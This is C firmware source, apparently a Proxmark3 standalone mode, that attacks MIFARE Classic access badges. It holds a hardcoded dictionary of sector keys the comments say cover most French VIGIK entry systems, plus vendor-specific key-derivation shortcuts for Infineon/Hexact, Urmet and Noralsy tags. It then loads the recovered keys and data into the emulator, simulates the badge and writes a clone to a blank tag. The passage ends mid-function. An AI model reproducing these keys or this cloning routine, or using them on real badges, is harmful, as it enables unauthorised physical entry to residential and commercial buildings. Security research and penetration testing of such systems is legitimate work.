//-----------------------------------------------------------------------------
// Colin Brigato, 2016,2017
// Christian Herrmann, 2017
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// main code for HF Mifare aka ColinRun by Colin Brigato
//-----------------------------------------------------------------------------
#include "hf_colin.h"

#define MF1KSZ 1024
#define MF1KSZSIZE 64
#define FALSE false
#define TRUE true
#define AUTHENTICATION_TIMEOUT 848

uint8_t cjuid[10];
uint32_t cjcuid;
int currline;
int currfline;
int curlline;

// TODO : Implement fast read of KEYS like in RFIdea
// als ohttp://ext.delaat.net/rp/2015-2016/p04/report.pdf

// Colin's VIGIKPWN sniff/simulate/clone repeat routine for HF Mifare

void cjPrintBigArray(const char *bigar, int len, uint8_t newlines, uint8_t debug) {
    uint32_t chunksize = (USB_CMD_DATA_SIZE / 4);
    uint8_t totalchunks = len / chunksize;
    uint8_t last_chunksize = len - (totalchunks * chunksize);
    char chunk[chunksize + 1];
    memset(chunk, 0x00, sizeof(chunk));
    if (debug > 0) {
        Dbprintf("len : %d", len);
        Dbprintf("chunksize : %d bytes", chunksize);
        Dbprintf("totalchunks : %d", totalchunks);
        Dbprintf("last_chunksize: %d", last_chunksize);
    }
    for (uint8_t i = 0; i < totalchunks; i++) {
        memset(chunk, 0x00, sizeof(chunk));
        memcpy(chunk, &bigar[i * chunksize], chunksize);
        DbprintfEx(FLAG_RAWPRINT, "%s", chunk);
    }
    if (last_chunksize > 0) {
        memset(chunk, 0x00, sizeof(chunk));
        memcpy(chunk, &bigar[totalchunks * chunksize], last_chunksize);
        DbprintfEx(FLAG_RAWPRINT, "%s", chunk);
    }
    if (newlines > 0) {
        DbprintfEx(FLAG_NOLOG, " ");
    }
}

void cjSetCursFRight() {
    // DbprintfEx(FLAG_RAWPRINT, "\r");
    // vtsend_cursor_position_save(NULL);

    // static int currline = 0;
    // vtsend_cursor_forward(NULL, 50);
    vtsend_cursor_position(NULL, 100, (currfline));
    currfline++;
}

void cjSetCursRight() {
    // DbprintfEx(FLAG_RAWPRINT, "\r");
    // vtsend_cursor_position_save(NULL);

    // static int currline = 0;
    // vtsend_cursor_forward(NULL, 50);
    vtsend_cursor_position(NULL, 70, (currline));
    currline++;
}

void cjSetCursLeft() {
    // DbprintfEx(FLAG_RAWPRINT, "\r");
    // vtsend_cursor_position_save(NULL);

    // static int curlline = 0;
    // vtsend_cursor_forward(NULL, 50);
    vtsend_cursor_position(NULL, 0, (curlline));
    curlline++;
}

void cjTabulize() { DbprintfEx(FLAG_RAWPRINT, "\t\t\t"); }

void RunMod() {
    currline = 20;
    curlline = 20;
    currfline = 20;
    memset(cjuid, 0, sizeof(cjuid));
    cjcuid = 0;
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
    uint8_t sectorsCnt = (MF1KSZ / MF1KSZSIZE);
    uint64_t key64;           // Defines current key
    uint8_t *keyBlock = NULL; // Where the keys will be held in memory.

/*
     Set of keys to be used.
     This should cover ~98% of
     French VIGIK system @2017
*/

#define STKEYS 35

    const uint64_t mfKeys[STKEYS] = {
        0xffffffffffff, // TRANSPORTS
        0x000000000000, // Blankkey
        0x484558414354, // INFINEONON A / 0F SEC B
        0x414c41524f4e, // ALARON NORALSY
        0x424c41524f4e, // BLARON NORALSY
        0x8829da9daf76, // URMET CAPTIV IF A => ALL A/B
        0xb0b1b2b3b4b5, // NA
        0xaabbccddeeff, // NA
        0x4d3a99c351dd, // NA
        0x1a982c7e459a, // NA
        0xd3f7d3f7d3f7, // NA
        0x714c5c886e97, // NA
        0x587ee5f9350f, // NA
        0xa0478cc39091, // NA
        0x533cb6c723f6, // NA
        0x8fd0a4f256e9, // NA
        0xa0a1a2a3a4a5, // PUBLIC BLOC0 BTICINO MAD ACCESS
        0x021209197591, // BTCINO UNDETERMINED SPREAKD 0x01->0x13 key
        0xa22ae129c013, // INFINEON B 00
        0x49fae4e3849f, // INFINEON B 01
        0x38fcf33072e0, // INFINEON B 02
        0x8ad5517b4b18, // INFINEON B 03
        0x509359f131b1, // INFINEON B 04
        0x6c78928e1317, // INFINEON B 05
        0xaa0720018738, // INFINEON B 06
        0xa6cac2886412, // INFINEON B 07
        0x62d0c424ed8e, // INFINEON B 08
        0xe64a986a5d94, // INFINEON B 09
        0x8fa1d601d0a2, // INFINEON B 0A
        0x89347350bd36, // INFINEON B 0B
        0x66d2b7dc39ef, // INFINEON B 0C
        0x6bc1e1ae547d, // INFINEON B 0D
        0x22729a9bd40f  // INFINEON B 0E
    };

    /* Can remember something like that in case of Bigbuf */
    keyBlock = BigBuf_malloc(STKEYS * 6);
    int mfKeysCnt = sizeof(mfKeys) / sizeof(uint64_t);

    for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++) {
        num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t *)(keyBlock + mfKeyCounter * 6));
    }

    /* TODO : remember why we actually had need to initialize this array in such specific case
       and why not a simple memset abuse to 0xffize the whole space in one go ? */
    // uint8_t foundKey[2][40][6]; //= [ {0xff} ]; /* C99 abusal 6.7.8.21 */

    uint8_t foundKey[2][40][6];
    for (uint16_t t = 0; t < 2; t++) {
        for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
            //          validKey[t][sectorNo] = false;
            for (uint16_t i = 0; i < 6; i++) {
                foundKey[t][sectorNo][i] = 0xff;
            }
        }
    }

    int key = -1;
    // int block = 0;
    bool err = 0;
    bool trapped = 0;
    bool allKeysFound = true;

    uint32_t size = mfKeysCnt; /* what’s the point for copy ? int should be
                                  uint32_t in this case, same deal */
    LED_A_OFF();
    LED_B_OFF();
    LED_C_OFF();
    LED_D_OFF();
    LED_A_ON();

banner:
    vtsend_reset(NULL);
    DbprintfEx(FLAG_NOLOG, "\r\n%s", clearTerm);
    cjPrintBigArray(LOGO, sizeof(LOGO), 0, 0);
    DbprintfEx(FLAG_NOLOG, "%s%s%s", _CYAN_, sub_banner, _WHITE_);
    DbprintfEx(FLAG_NOLOG, "%s>>%s C.J.B's MifareFastPwn Started\r\n", _RED_, _WHITE_);

failtag:
    currline = 20;
    curlline = 20;
    currfline = 20;
    // vtsend_draw_box(NULL, 0, 20, 20, 40);
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "\t\t\t[ Waiting For Tag ]");
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    while (!iso14443a_select_card(cjuid, NULL, &cjcuid, true, 0, true)) {
        WDT_HIT();
    }
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    // SpinDelay(100);
    SpinDelay(200);

    // DbprintfEx(FLAG_RAWPRINT,"Got tag : %02x%02x%02x%02x", at91stdio_explode(cjuid, &cjcuid));
    // DbprintfEx(FLAG_RAWPRINT, "GOT TAG : %02x%02x%02x%02x\n", cjuid[0], cjuid[1], cjuid[2], cjuid[3]);
    cjSetCursRight();

    DbprintfEx(FLAG_NOLOG, "GOT TAG : %08x", cjcuid);

    if (cjcuid == 0) {
        cjSetCursLeft();

        DbprintfEx(FLAG_NOLOG, "%s>>%s BUG: 0000_CJCUID! Retrying...");
        goto failtag;
    }
    cjSetCursRight();
    DbprintfEx(FLAG_NOLOG, "--------+--------------------+-------");
    cjSetCursRight();
    DbprintfEx(FLAG_NOLOG, " SECTOR |        KEY         |  A/B  ");
    cjSetCursRight();
    DbprintfEx(FLAG_NOLOG, "--------+--------------------+-------");

    uint32_t end_time;
    uint32_t start_time = end_time = GetTickCount();

    /////////////////////////////////////////////////////////
    // WE SHOULD FIND A WAY TO GET UID TO AVOID THIS "TESTRUN"

    // HERE IS TO BE THOUGHT AS ONLY A KEY SHOULD BE CHECK
    // THEN WE FILL EMULATOR WITH KEY
    // WHEN WE FILL EMULATOR CARD WITH A KEY
    // IF THERE IS ANY FAIL DURING ANY POINT, WE START BACK CHECKING B KEYS
    // THEN FILL EMULATOR WITH B KEEY
    // THEN EMULATOR WITH CARD WITH B KEY
    // IF IT HAS FAILED OF ANY OF SORT THEN WE ARE MARRON LIKE POMALO.

    // AN EVEN BETTER IMPLEMENTATION IS TO CHECK EVERY KEY FOR SECTOR 0 KEY A
    // THEN IF FOUND CHECK THE SAME KEY FOR NEXT SECTOR ONLY KEY A
    // THEN IF FAIL CHECK EVERY SECTOR A KEY FOR EVERY OTHER KEY BUT NOT THE BLOCK
    // 0 KEY
    // THEN TRY TO READ B KEYS FROM KNOWN A KEYS
    // IF FAIL, CHECK SECTOR 0 B KEY WITH SECTOR 0 A KEY
    // THEN IF FOUND CHECK EVERY SECTOR FOR SAME B KEY
    // ELSE IF FAIL CHECK EVERY KEY FOR SECTOR 0 KEY B
    // THEN IF FOUND CHECK SAME KEY FOR ONLY NEXT SECTOR KEY B (PROBABLE A KEY IS
    // SAME FOR EVERY SECTOR AND B KEY IS SAME FOR EVERY SECTOR WITH JUST A vs B
    // DERIVATION
    // THEN IF B KEY IS NOT OF THIS SCHEME CHECK EVERY REMAINING B KEYED SECTOR
    // WITH EVERY REMAINING KEYS, BUT DISCARDING ANY DEFAULT TRANSPORT KEYS.
    /////////////////////////////////////////////////////

    // also we could avoid first UID check for every block

    /* then let’s expose this “optimal case” of “well known vigik schemes” : */
    for (uint8_t type = 0; type < 2 && !err && !trapped; type++) {
        for (int sec = 0; sec < sectorsCnt && !err && !trapped; ++sec) {
            key = cjat91_saMifareChkKeys(sec * 4, type, NULL, size, &keyBlock[0], &key64);
            // key = saMifareChkKeys(sec * 4, type, NULL, size, &keyBlock[0], &key64);
            if (key == -1) {
                err = 1;
                allKeysFound = false;
                /* used in “portable” imlementation on microcontroller: it reports back the fail and open the standalone lock */
                // cmd_send(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
                break;
            } else if (key == -2) {
                err = 1; // Can't select card.
                allKeysFound = false;
                // cmd_send(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
                break;
            } else {
                /*  BRACE YOURSELF : AS LONG AS WE TRAP A KNOWN KEY, WE STOP CHECKING AND ENFORCE KNOWN SCHEMES */
                // uint8_t tosendkey[12];
                char tosendkey[12];
                num_to_bytes(key64, 6, foundKey[type][sec]);
                cjSetCursRight();
                DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %012" PRIx64 " ; TYP: %i", sec, key64, type);
                /*cmd_send(CMD_CJB_INFORM_CLIENT_KEY, 12, sec, type, tosendkey, 12);*/

                switch (key64) {
                /////////////////////////////////////////////////////////
                // COMMON SCHEME 1  : INFINITRON/HEXACT
                case 0x484558414354:
                    cjSetCursLeft();
                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _RED_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _GREEN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%sDetected: %s INFI_HEXACT_VIGIK_TAG%s", _ORANGE_, _CYAN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "...%s[%sKey_derivation_schemeTest%s]%s...", _YELLOW_, _GREEN_, _YELLOW_, _GREEN_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _GREEN_, _WHITE_);
                    ;
                    // Type 0 / A first
                    uint16_t t = 0;
                    for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
                        num_to_bytes(0x484558414354, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();
                        DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    }
                    t = 1;
                    uint16_t sectorNo = 0;
                    num_to_bytes(0xa22ae129c013, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 1;
                    num_to_bytes(0x49fae4e3849f, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 2;
                    num_to_bytes(0x38fcf33072e0, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 3;
                    num_to_bytes(0x8ad5517b4b18, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 4;
                    num_to_bytes(0x509359f131b1, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 5;
                    num_to_bytes(0x6c78928e1317, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 6;
                    num_to_bytes(0xaa0720018738, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 7;
                    num_to_bytes(0xa6cac2886412, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 8;
                    num_to_bytes(0x62d0c424ed8e, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 9;
                    num_to_bytes(0xe64a986a5d94, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 10;
                    num_to_bytes(0x8fa1d601d0a2, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 11;
                    num_to_bytes(0x89347350bd36, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 12;
                    num_to_bytes(0x66d2b7dc39ef, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 13;
                    num_to_bytes(0x6bc1e1ae547d, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 14;
                    num_to_bytes(0x22729a9bd40f, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    sectorNo = 15;
                    num_to_bytes(0x484558414354, 6, foundKey[t][sectorNo]);
                    sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                            foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                    cjSetCursRight();

                    DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    trapped = 1;
                    break;
                ////////////////END OF SCHEME 1//////////////////////////////

                ///////////////////////////////////////
                // COMMON SCHEME 2  : URMET CAPTIVE / COGELEC!/?
                case 0x8829da9daf76:
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _RED_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _GREEN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%sDetected :%sURMET_CAPTIVE_VIGIK_TAG%s", _ORANGE_, _CYAN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "...%s[%sKey_derivation_schemeTest%s]%s...", _YELLOW_, _GREEN_, _YELLOW_, _GREEN_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _GREEN_, _WHITE_);
                    cjSetCursLeft();

                    // emlClearMem();
                    // A very weak one...
                    for (uint16_t t = 0; t < 2; t++) {
                        for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
                            num_to_bytes(key64, 6, foundKey[t][sectorNo]);
                            sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                    foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                            cjSetCursRight();

                            DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        }
                    }
                    trapped = 1;
                    break;
                ////////////////END OF SCHEME 2//////////////////////////////

                ///////////////////////////////////////
                // COMMON SCHEME 3  : NORALSY "A-LARON & B-LARON . . . NORAL-B & NORAL-A"
                case 0x414c41524f4e: // Thumbs up to the guy who had the idea of such a "mnemotechnical" key pair
                case 0x424c41524f4e:
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*STOP*!<<<<<<<<<<<<<<%s", _RED_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "    .TAG SEEMS %sDETERMINISTIC%s.     ", _GREEN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s  Detected :%sNORALSY_VIGIK_TAG %s", _ORANGE_, _CYAN_, _WHITE_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "...%s[%sKey_derivation_schemeTest%s]%s...", _YELLOW_, _GREEN_, _YELLOW_, _GREEN_);
                    cjSetCursLeft();

                    DbprintfEx(FLAG_NOLOG, "%s>>>>>>>>>>>>!*DONE*!<<<<<<<<<<<<<<%s", _GREEN_, _WHITE_);
                    ;
                    t = 0;
                    for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
                        num_to_bytes(0x414c41524f4e, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                        ;
                    }
                    t = 1;
                    for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
                        num_to_bytes(0x424c41524f4e, 6, foundKey[t][sectorNo]);
                        sprintf(tosendkey, "%02x%02x%02x%02x%02x%02x", foundKey[t][sectorNo][0], foundKey[t][sectorNo][1], foundKey[t][sectorNo][2],
                                foundKey[t][sectorNo][3], foundKey[t][sectorNo][4], foundKey[t][sectorNo][5]);
                        cjSetCursRight();

                        DbprintfEx(FLAG_NOLOG, "SEC: %02x ; KEY : %s ; TYP: %d", sectorNo, tosendkey, t);
                    }
                    trapped = 1;
                    break;
                    ////////////////END OF SCHEME 3//////////////////////////////
                }
                /* etc etc for testing schemes quick schemes */
            }
        }
    }

    if (!allKeysFound) {
        // cmd_send(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
        cjSetCursLeft();
        cjTabulize();
        DbprintfEx(FLAG_NOLOG, "%s>> FAIL : did not found all the keys :'(%s", _RED_, _WHITE_);
        return;
    }

    /* Settings keys to emulator */
    emlClearMem();
    uint8_t mblock[16];
    for (uint8_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
        emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
        for (uint8_t t = 0; t < 2; t++) {
            memcpy(mblock + t * 10, foundKey[t][sectorNo], 6);
        }
        emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
    }
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "%s>>%s Setting Keys->Emulator MEM...[%sOK%s]", _YELLOW_, _WHITE_, _GREEN_, _WHITE_);

    /* filling TAG to emulator */
    uint8_t filled = 0;
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "%s>>%s Filling Emulator <- from A keys...", _YELLOW_, _WHITE_);
    e_MifareECardLoad(sectorsCnt, 0, 0, &filled);
    if (filled != 1) {
        cjSetCursLeft();

        DbprintfEx(FLAG_NOLOG, "%s>>%s W_FAILURE ! %sTrying fallback B keys....", _RED_, _ORANGE_, _WHITE_);

        /* no trace, no dbg  */
        e_MifareECardLoad(sectorsCnt, 1, 0, &filled);
        if (filled != 1) {
            cjSetCursLeft();

            DbprintfEx(FLAG_NOLOG, "FATAL:EML_FALLBACKFILL_B");
            // cmd_send(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);
            return;
        }
    }
    end_time = GetTickCount();
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "%s>>%s Time for VIGIK break :%s%dms%s", _GREEN_, _WHITE_, _YELLOW_, end_time - start_time, _WHITE_);
    // cmd_send(CMD_CJB_FSMSTATE_MENU, 0, 0, 0, 0, 0);

    // SIM ?
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "-> We launch Emulation ->");
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "%sHOLD ON : %s When you'll click, simm will stop", _RED_, _WHITE_);
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "Then %s immediately %s Well' try to %s dump our emulator state%s \r\n in a %s chinese tag%s", _RED_, _WHITE_, _YELLOW_, _WHITE_,
               _CYAN_, _WHITE_);
    cjSetCursLeft();
    cjSetCursLeft();

    cjTabulize();

    DbprintfEx(FLAG_NOLOG, "[SimulaWaiting...]");
    Mifare1ksim(0, 0, 0, NULL);
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "<- We're out of Emulation");
    // END SIM

    /*for (;;) {
        WDT_HIT();

        int button_action = BUTTON_HELD(500);
        if (button_action == 0) { // No button action, proceed with sim
            SpinDelay(100);
            WDT_HIT();

        } else if (button_action == BUTTON_SINGLE_CLICK) {
            */
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "-> Trying a clone !");
    saMifareMakeTag();
    cjSetCursLeft();

    DbprintfEx(FLAG_NOLOG, "-> End Cloning.");
    WDT_HIT();

    // break;
    /*} else if (button_action == BUTTON_HOLD) {
        DbprintfEx(FLAG_RAWPRINT,"Playtime over. Begin cloning...");
        iGotoClone = 1;
        break;
    }*/

    // Debunk...
    // SpinDelay(300);
    cjSetCursLeft();
    cjTabulize();

    DbprintfEx(FLAG_NOLOG, "[EOSf_tandalone]\r\n-> You can take shell back :) ...");
    cjSetCursLeft();

    return;
}

/* Abusive microgain on original MifareECardLoad :
 * - *datain used as error return
 * - tracing is falsed
 */
void e_MifareECardLoad(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_t *datain) {
    MF_DBGLEVEL = MF_DBG_NONE;

    uint8_t numSectors = arg0;
    uint8_t keyType = arg1;
    uint64_t ui64Key = 0;
    // uint32_t cuid;
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    byte_t dataoutbuf[16];
    byte_t dataoutbuf2[16];
    // uint8_t uid[10];

    LED_A_ON();
    LED_B_OFF();
    LED_C_OFF();
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);

    clear_trace();
    set_tracing(false);

    bool isOK = true;
    iso14443a_fast_select_card(cjuid, 0);

    /* if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
    isOK = false;
    if (MF_DBGLEVEL >= 1)
        DbprintfEx(FLAG_RAWPRINT,"Can't select card");
}*/

    for (uint8_t sectorNo = 0; isOK && sectorNo < numSectors; sectorNo++) {
        ui64Key = emlGetKey(sectorNo, keyType);
        if (sectorNo == 0) {
            if (isOK && mifare_classic_auth(pcs, cjcuid, FirstBlockOfSector(sectorNo), keyType, ui64Key, AUTH_FIRST)) {
                isOK = false;
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Sector[%2d]. Auth error", sectorNo);
                break;
            }
        } else {
            if (isOK && mifare_classic_auth(pcs, cjcuid, FirstBlockOfSector(sectorNo), keyType, ui64Key, AUTH_NESTED)) {
                isOK = false;
                if (MF_DBGLEVEL >= 1)
                    DbprintfEx(FLAG_NOLOG, "Sector[%2d]. Auth nested error", sectorNo);
                break;
            }
        }

        for (uint8_t blockNo = 0; isOK && blockNo < NumBlocksPerSector(sectorNo); blockNo++) {
